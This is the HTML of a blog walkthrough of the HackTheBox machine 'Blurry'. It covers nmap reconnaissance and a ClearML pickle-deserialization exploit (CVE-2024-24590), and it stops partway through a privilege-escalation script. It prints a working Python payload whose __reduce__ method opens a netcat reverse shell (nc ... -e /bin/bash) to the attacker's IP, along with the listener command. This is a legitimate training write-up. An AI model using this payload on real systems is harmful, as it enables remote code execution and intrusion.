@@ -1,0 +1,625 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <title>
+  Blurry HTB Walkthrough · Chief Dennis&#39; Blog
+</title>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="color-scheme" content="light dark">
+
+
+
+
+<meta name="author" content="Dennis Drebitca">
+<meta name="description" content="The Blurry HTB machine is a medium difficulty level HackTheBox Machine. The main techniques and tools used to crack this machine are:
+- ClearML- CVE-2024-24590- Json deserialization- Scipt analysis- Fickling- Python scriptingReconnaissanceLink to headingWe start a broad Nmap scan by executing the following command:
+sudo nmap -sS -T5 -vvv -p- 10.10.11.19 -Pn -oG nmap_inicial Where the arguments mean:
+-sS: SYN port scan-T5: Using timing template 5 of NMAP-vvv: Triple verbose so NMAP prints a lot of information-p-: All ports are scanned-Pn: Skips Host Discovery-oG: Grep FormatThe scan returns the following information:">
+<meta name="keywords" content="blog,developer,personal,cybersecurity,IT,cloud">
+
+<meta name="twitter:card" content="summary"/><meta name="twitter:title" content="Blurry HTB Walkthrough"/>
+<meta name="twitter:description" content="The Blurry HTB machine is a medium difficulty level HackTheBox Machine. The main techniques and tools used to crack this machine are:
+- ClearML- CVE-2024-24590- Json deserialization- Scipt analysis- Fickling- Python scriptingReconnaissanceLink to headingWe start a broad Nmap scan by executing the following command:
+sudo nmap -sS -T5 -vvv -p- 10.10.11.19 -Pn -oG nmap_inicial Where the arguments mean:
+-sS: SYN port scan-T5: Using timing template 5 of NMAP-vvv: Triple verbose so NMAP prints a lot of information-p-: All ports are scanned-Pn: Skips Host Discovery-oG: Grep FormatThe scan returns the following information:"/>
+
+<meta property="og:title" content="Blurry HTB Walkthrough" />
+<meta property="og:description" content="The Blurry HTB machine is a medium difficulty level HackTheBox Machine. The main techniques and tools used to crack this machine are:
+- ClearML- CVE-2024-24590- Json deserialization- Scipt analysis- Fickling- Python scriptingReconnaissanceLink to headingWe start a broad Nmap scan by executing the following command:
+sudo nmap -sS -T5 -vvv -p- 10.10.11.19 -Pn -oG nmap_inicial Where the arguments mean:
+-sS: SYN port scan-T5: Using timing template 5 of NMAP-vvv: Triple verbose so NMAP prints a lot of information-p-: All ports are scanned-Pn: Skips Host Discovery-oG: Grep FormatThe scan returns the following information:" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://chiefdennis.github.io/posts/htb_blurry/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2024-06-16T13:07:16+01:00" />
+<meta property="article:modified_time" content="2024-06-16T13:07:16+01:00" />
+<meta property="og:see_also" content="https://chiefdennis.github.io/posts/htb_runner/" /><meta property="og:see_also" content="https://chiefdennis.github.io/posts/htb_boardlight/" /><meta property="og:see_also" content="https://chiefdennis.github.io/posts/htb_usage/" /><meta property="og:see_also" content="https://chiefdennis.github.io/posts/htb_monitored/" /><meta property="og:see_also" content="https://chiefdennis.github.io/posts/htb_bizness/" />
+
+
+
+
+
+
+<link rel="canonical" href="https://chiefdennis.github.io/posts/htb_blurry/">
+
+
+<link rel="preload" href="/fonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/fonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/fonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin>
+
+
+  
+  
+  <link rel="stylesheet" href="/css/coder.min.38c4552ac40f9ae3408bad40358f654ebd8804412fe74ed56f2d6c8a7af82dd3.css" integrity="sha256-OMRVKsQPmuNAi61ANY9lTr2IBEEv507Vby1sinr4LdM=" crossorigin="anonymous" media="screen" />
+
+
+
+
+
+
+  
+    
+    
+    <link rel="stylesheet" href="/css/coder-dark.min.a00e6364bacbc8266ad1cc81230774a1397198f8cfb7bcba29b7d6fcb54ce57f.css" integrity="sha256-oA5jZLrLyCZq0cyBIwd0oTlxmPjPt7y6KbfW/LVM5X8=" crossorigin="anonymous" media="screen" />
+  
+
+
+
+ 
+  
+    
+    <link rel="stylesheet" href="/css/custom.min.de332fc1405ae8603f697e77d3ffe869fde950cc77184ea542dc2be374a0b92b.css" integrity="sha256-3jMvwUBa6GA/aX530//oaf3pUMx3GE6lQtwr43SguSs=" crossorigin="anonymous" media="screen" />
+  
+
+
+
+
+
+<link rel="icon" type="image/svg+xml" href="/images/favicon.svg" sizes="any">
+<link rel="icon" type="image/png" href="/images/favicon-32x32.png" sizes="32x32">
+<link rel="icon" type="image/png" href="/images/favicon-16x16.png" sizes="16x16">
+
+<link rel="apple-touch-icon" href="/images/apple-touch-icon.png">
+<link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+<link rel="manifest" href="/site.webmanifest">
+<link rel="mask-icon" href="/images/safari-pinned-tab.svg" color="#5bbad5">
+
+
+
+
+
+
+
+
+
+</head>
+
+
+
+
+
+
+<body class="preload-transitions colorscheme-auto">
+  
+<div class="float-container">
+    <a id="dark-mode-toggle" class="colorscheme-toggle">
+        <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+    </a>
+</div>
+
+
+  <main class="wrapper">
+    <nav class="navigation">
+  <section class="container">
+    
+    <a class="navigation-title" href="https://chiefdennis.github.io">
+      Chief Dennis&#39; Blog
+    </a>
+    
+    
+      <input type="checkbox" id="menu-toggle" />
+      <label class="menu-button float-right" for="menu-toggle">
+        <i class="fa-solid fa-bars fa-fw" aria-hidden="true"></i>
+      </label>
+      <ul class="navigation-list">
+        
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/about/">About</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/posts/">Catch The Flag</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/projects/">Projects</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/tags/">Tags</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/contact/">Contact me</a>
+            </li>
+          
+        
+        
+      </ul>
+    
+  </section>
+</nav>
+
+
+    <div class="content">
+      
+  <section class="container post">
+    <article>
+      <header>
+        <div class="post-title">
+          <h1 class="title">
+            <a class="title-link" href="https://chiefdennis.github.io/posts/htb_blurry/">
+              Blurry HTB Walkthrough
+            </a>
+          </h1>
+        </div>
+        <div class="post-meta">
+          <div class="date">
+            <span class="posted-on">
+              <i class="fa-solid fa-calendar" aria-hidden="true"></i>
+              <time datetime="2024-06-16T13:07:16&#43;01:00">
+                June 16, 2024
+              </time>
+            </span>
+            <span class="reading-time">
+              <i class="fa-solid fa-clock" aria-hidden="true"></i>
+              7-minute read
+            </span>
+          </div>
+          <div class="authors">
+  <i class="fa-solid fa-user" aria-hidden="true"></i>
+    <a href="/authors/dennis-drebitca/">Dennis Drebitca</a></div>
+
+          
+          <div class="tags">
+  <i class="fa-solid fa-tag" aria-hidden="true"></i>
+    <span class="tag">
+      <a href="/tags/cve-2024-24590/">CVE-2024-24590</a>
+    </span>
+      <span class="separator">•</span>
+    <span class="tag">
+      <a href="/tags/json-deserialization/">Json deserialization</a>
+    </span>
+      <span class="separator">•</span>
+    <span class="tag">
+      <a href="/tags/script-analysis/">Script analysis</a>
+    </span>
+      <span class="separator">•</span>
+    <span class="tag">
+      <a href="/tags/fickling/">Fickling</a>
+    </span>
+      <span class="separator">•</span>
+    <span class="tag">
+      <a href="/tags/clearml/">ClearML</a>
+    </span>
+      <span class="separator">•</span>
+    <span class="tag">
+      <a href="/tags/python-scripting/">Python scripting</a>
+    </span></div>
+
+        </div>
+      </header>
+
+      <div class="post-content">
+        
+        <p><img src="Scr_6.png#center" alt="image"></p>
+<p>The Blurry HTB machine is a medium difficulty level HackTheBox Machine. The main techniques and tools used to crack this machine are:</p>
+<pre><code>- ClearML
+- CVE-2024-24590
+- Json deserialization
+- Scipt analysis
+- Fickling
+- Python scripting
+</code></pre>
+<h2 id="reconnaissance">
+  Reconnaissance
+  <a class="heading-link" href="#reconnaissance">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<p>We start a broad Nmap scan by executing the following command:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">sudo nmap -sS -T5 -vvv -p- 10.10.11.19 -Pn -oG nmap_inicial
+</span></span></code></pre></div><p>Where the arguments mean:</p>
+<pre><code>-sS: SYN port scan
+-T5: Using timing template 5 of NMAP
+-vvv: Triple verbose so NMAP prints a lot of information
+-p-: All ports are scanned
+-Pn: Skips Host Discovery
+-oG: Grep Format
+</code></pre>
+<p>The scan returns the following information:</p>
+<p><img src="Scr.png" alt="image"></p>
+<p>It looks like ports 20, 80 and 8000 are open. Next, we run a more comprehensive scan on the open ports:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">sudo nmap -sCV -p22,80,8000 10.10.11.13 -oN nmap_exhaustivo -v
+</span></span></code></pre></div><p>Now the arguments used mean:</p>
+<pre><code>-sCV: Launches all scanning scripts to discover services and versions running on these ports
+-oN: Normal output format
+-v: Single verbose
+</code></pre>
+<p>The results for this second scan are the following:</p>
+<p><img src="Scr_1.png" alt="image"></p>
+<p>This is the page visible on port 80:</p>
+<p><img src="Scr_2.png" alt="image"></p>
+<p>Whatweb gives us the following report:</p>
+<p><img src="Scr_3.png" alt="image"></p>
+<h2 id="initial-access">
+  Initial access
+  <a class="heading-link" href="#initial-access">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<p>Searching the web, we have found some interesting  PoC for <a href="https://hiddenlayer.com/research/not-so-clear-how-mlops-solutions-can-muddy-the-waters-of-your-supply-chain/"  class="external-link" target="_blank" rel="noopener">CVE-2024-24590</a>.</p>
+<p>But first, we have to install clearml on our machine to be able to interact with the website. We do</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">pip install clearml
+</span></span><span class="line"><span class="cl">clearml-init
+</span></span></code></pre></div><p>Now, it asks as to input the configuration of the clearML project. We can create a new user on <a href="http://app.blurry.htb/login"  class="external-link" target="_blank" rel="noopener">http://app.blurry.htb/login</a> and click on create new credentials. Paste it on the setup script, and we are ready to start tampering with clearML. <strong>It is important to add all subdomains needed to /etc/hosts/</strong></p>
+<p><img src="Scr_7.png" alt="image"></p>
+<p>On the projects page, we can see that there is a periodic script run that checks for the JSON artifacts and parses them. This is the script that is run:</p>
+<p><img src="Scr_8.png" alt="image"></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/python3</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">clearml</span> <span class="kn">import</span> <span class="n">Task</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">multiprocessing</span> <span class="kn">import</span> <span class="n">Process</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">clearml.backend_api.session.client</span> <span class="kn">import</span> <span class="n">APIClient</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">process_json_artifact</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">artifact_name</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s2">    Process a JSON artifact represented as a Python dictionary.
+</span></span></span><span class="line"><span class="cl"><span class="s2">    Print all key-value pairs contained in the dictionary.
+</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[+] Artifact &#39;</span><span class="si">{</span><span class="n">artifact_name</span><span class="si">}</span><span class="s2">&#39; Contents:&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">key</span><span class="p">,</span> <span class="n">value</span> <span class="ow">in</span> <span class="n">data</span><span class="o">.</span><span class="n">items</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34; - </span><span class="si">{</span><span class="n">key</span><span class="si">}</span><span class="s2">: </span><span class="si">{</span><span class="n">value</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">process_task</span><span class="p">(</span><span class="n">task</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">artifacts</span> <span class="o">=</span> <span class="n">task</span><span class="o">.</span><span class="n">artifacts</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">artifact_name</span><span class="p">,</span> <span class="n">artifact_object</span> <span class="ow">in</span> <span class="n">artifacts</span><span class="o">.</span><span class="n">items</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">        <span class="n">data</span> <span class="o">=</span> <span class="n">artifact_object</span><span class="o">.</span><span class="n">get</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="nb">dict</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">            <span class="n">process_json_artifact</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">artifact_name</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[!] Artifact &#39;</span><span class="si">{</span><span class="n">artifact_name</span><span class="si">}</span><span class="s2">&#39; content is not a dictionary.&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">review_task</span> <span class="o">=</span> <span class="n">Task</span><span class="o">.</span><span class="n">init</span><span class="p">(</span><span class="n">project_name</span><span class="o">=</span><span class="s2">&#34;Black Swan&#34;</span><span class="p">,</span> 
+</span></span><span class="line"><span class="cl">                            <span class="n">task_name</span><span class="o">=</span><span class="s2">&#34;Review JSON Artifacts&#34;</span><span class="p">,</span> 
+</span></span><span class="line"><span class="cl">                            <span class="n">task_type</span><span class="o">=</span><span class="n">Task</span><span class="o">.</span><span class="n">TaskTypes</span><span class="o">.</span><span class="n">data_processing</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1"># Retrieve tasks tagged for review</span>
+</span></span><span class="line"><span class="cl">    <span class="n">tasks</span> <span class="o">=</span> <span class="n">Task</span><span class="o">.</span><span class="n">get_tasks</span><span class="p">(</span><span class="n">project_name</span><span class="o">=</span><span class="s1">&#39;Black Swan&#39;</span><span class="p">,</span> <span class="n">tags</span><span class="o">=</span><span class="p">[</span><span class="s2">&#34;review&#34;</span><span class="p">],</span> <span class="n">allow_archived</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">tasks</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[!] No tasks up for review.&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="n">threads</span> <span class="o">=</span> <span class="p">[]</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">task</span> <span class="ow">in</span> <span class="n">tasks</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[+] Reviewing artifacts from task: </span><span class="si">{</span><span class="n">task</span><span class="o">.</span><span class="n">name</span><span class="si">}</span><span class="s2"> (ID: </span><span class="si">{</span><span class="n">task</span><span class="o">.</span><span class="n">id</span><span class="si">}</span><span class="s2">)&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">p</span> <span class="o">=</span> <span class="n">Process</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">process_task</span><span class="p">,</span> <span class="n">args</span><span class="o">=</span><span class="p">(</span><span class="n">task</span><span class="p">,))</span>
+</span></span><span class="line"><span class="cl">        <span class="n">p</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="n">threads</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">task</span><span class="o">.</span><span class="n">set_archived</span><span class="p">(</span><span class="kc">True</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">thread</span> <span class="ow">in</span> <span class="n">threads</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">thread</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="mi">60</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">thread</span><span class="o">.</span><span class="n">is_alive</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">            <span class="n">thread</span><span class="o">.</span><span class="n">terminate</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1"># Mark the ClearML task as completed</span>
+</span></span><span class="line"><span class="cl">    <span class="n">review_task</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">cleanup</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">client</span> <span class="o">=</span> <span class="n">APIClient</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">tasks</span> <span class="o">=</span> <span class="n">client</span><span class="o">.</span><span class="n">tasks</span><span class="o">.</span><span class="n">get_all</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">        <span class="n">system_tags</span><span class="o">=</span><span class="p">[</span><span class="s2">&#34;archived&#34;</span><span class="p">],</span>
+</span></span><span class="line"><span class="cl">        <span class="n">only_fields</span><span class="o">=</span><span class="p">[</span><span class="s2">&#34;id&#34;</span><span class="p">],</span>
+</span></span><span class="line"><span class="cl">        <span class="n">order_by</span><span class="o">=</span><span class="p">[</span><span class="s2">&#34;-last_update&#34;</span><span class="p">],</span>
+</span></span><span class="line"><span class="cl">        <span class="n">page_size</span><span class="o">=</span><span class="mi">100</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="n">page</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1"># delete and cleanup tasks</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">task</span> <span class="ow">in</span> <span class="n">tasks</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="c1"># noinspection PyBroadException</span>
+</span></span><span class="line"><span class="cl">        <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">deleted_task</span> <span class="o">=</span> <span class="n">Task</span><span class="o">.</span><span class="n">get_task</span><span class="p">(</span><span class="n">task_id</span><span class="o">=</span><span class="n">task</span><span class="o">.</span><span class="n">id</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">deleted_task</span><span class="o">.</span><span class="n">delete</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">                <span class="n">delete_artifacts_and_models</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                <span class="n">skip_models_used_by_other_tasks</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                <span class="n">raise_on_error</span><span class="o">=</span><span class="kc">False</span>
+</span></span><span class="line"><span class="cl">            <span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">ex</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">continue</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">main</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">cleanup</span><span class="p">()</span>
+</span></span></code></pre></div><p>Lets see if we can create a task that uploads a malicious artifact. First, we have to have in mind from this line of code:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="c1"># Retrieve tasks tagged for review</span>
+</span></span><span class="line"><span class="cl">    <span class="n">tasks</span> <span class="o">=</span> <span class="n">Task</span><span class="o">.</span><span class="n">get_tasks</span><span class="p">(</span><span class="n">project_name</span><span class="o">=</span><span class="s1">&#39;Black Swan&#39;</span><span class="p">,</span> <span class="n">tags</span><span class="o">=</span><span class="p">[</span><span class="s2">&#34;review&#34;</span><span class="p">],</span> <span class="n">allow_archived</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
+</span></span></code></pre></div><p>The tasks that we create have to have the &ldquo;review&rdquo; tag to be picked up by the script. Next, we have to create a python dictionary that can be interpreted by the script. Otherwise, it will throw an error. The check is in the following line:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="k">if</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="nb">dict</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">            <span class="n">process_json_artifact</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">artifact_name</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[!] Artifact &#39;</span><span class="si">{</span><span class="n">artifact_name</span><span class="si">}</span><span class="s2">&#39; content is not a dictionary.&#34;</span><span class="p">)</span>
+</span></span></code></pre></div><p>A python dictionary has the following structure:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="n">dictionary</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;key&#39;</span><span class="p">:</span><span class="s1">&#39;value&#39;</span><span class="p">}</span>
+</span></span></code></pre></div><p>We will create a new class named RunCommand, that we&rsquo;ll pass as a value in the dictionary. This new class will attempt to set up a reverse shell using netcat.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">clearml</span> <span class="kn">import</span> <span class="n">Task</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34; Create the task with the review tag &#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">task</span> <span class="o">=</span> <span class="n">Task</span><span class="o">.</span><span class="n">init</span><span class="p">(</span><span class="n">project_name</span><span class="o">=</span><span class="s1">&#39;Black Swan&#39;</span><span class="p">,</span> <span class="n">task_name</span><span class="o">=</span><span class="s1">&#39;Task&#39;</span><span class="p">,</span> <span class="n">tags</span><span class="o">=</span><span class="p">[</span><span class="s2">&#34;review&#34;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34; Create the RunCommand class &#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">RunCommand</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">__reduce__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">,</span> <span class="p">(</span><span class="s2">&#34;nc 10.10.14.220 1234 -e /bin/bash&#34;</span><span class="p">,))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34; Create the dictionary and pass an instance as a value in the dict &#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">dictionary</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;key&#39;</span><span class="p">:</span> <span class="n">RunCommand</span><span class="p">()}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34; Upload the artifact &#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">task</span><span class="o">.</span><span class="n">upload_artifact</span><span class="p">(</span><span class="s1">&#39;MyObject.json&#39;</span><span class="p">,</span> <span class="n">artifact_object</span><span class="o">=</span><span class="n">dictionary</span><span class="p">)</span>
+</span></span></code></pre></div><p>Remember to set up the listener before executing the command:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">nc -lvnp <span class="m">1234</span>
+</span></span></code></pre></div><p><img src="Scr_9.png" alt="image"></p>
+<p><img src="Scr_10.png" alt="image"></p>
+<p>After treating the tty, we can get now the user password.</p>
+<p><img src="Scr_11.png" alt="image"></p>
+<h2 id="privilege-escalation">
+  Privilege escalation
+  <a class="heading-link" href="#privilege-escalation">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<p>Lets check what user jippity can do as sudo without password by executing sudo -l:</p>
+<p><img src="Scr_12.png" alt="image"></p>
+<p>User jippity can run the command &lsquo;/usr/bin/evaluate_model /models/*.pth&rsquo; as root. Lets see if we can analyze the evaluate_model binary.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="cp">#!/bin/bash
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="c1"># Evaluate a given model against our proprietary dataset.</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Security checks against model file included.</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="o">[</span> <span class="s2">&#34;</span><span class="nv">$#</span><span class="s2">&#34;</span> -ne <span class="m">1</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
+</span></span><span class="line"><span class="cl">    /usr/bin/echo <span class="s2">&#34;Usage: </span><span class="nv">$0</span><span class="s2"> &lt;path_to_model.pth&gt;&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">exit</span> <span class="m">1</span>
+</span></span><span class="line"><span class="cl"><span class="k">fi</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">MODEL_FILE</span><span class="o">=</span><span class="s2">&#34;</span><span class="nv">$1</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">TEMP_DIR</span><span class="o">=</span><span class="s2">&#34;/models/temp&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">PYTHON_SCRIPT</span><span class="o">=</span><span class="s2">&#34;/models/evaluate_model.py&#34;</span>  
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">/usr/bin/mkdir -p <span class="s2">&#34;</span><span class="nv">$TEMP_DIR</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">file_type</span><span class="o">=</span><span class="k">$(</span>/usr/bin/file --brief <span class="s2">&#34;</span><span class="nv">$MODEL_FILE</span><span class="s2">&#34;</span><span class="k">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Extract based on file type</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="o">[[</span> <span class="s2">&#34;</span><span class="nv">$file_type</span><span class="s2">&#34;</span> <span class="o">==</span> *<span class="s2">&#34;POSIX tar archive&#34;</span>* <span class="o">]]</span><span class="p">;</span> <span class="k">then</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># POSIX tar archive (older PyTorch format)</span>
+</span></span><span class="line"><span class="cl">    /usr/bin/tar -xf <span class="s2">&#34;</span><span class="nv">$MODEL_FILE</span><span class="s2">&#34;</span> -C <span class="s2">&#34;</span><span class="nv">$TEMP_DIR</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="k">elif</span> <span class="o">[[</span> <span class="s2">&#34;</span><span class="nv">$file_type</span><span class="s2">&#34;</span> <span class="o">==</span> *<span class="s2">&#34;Zip archive data&#34;</span>* <span class="o">]]</span><span class="p">;</span> <span class="k">then</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># Zip archive (newer PyTorch format)</span>
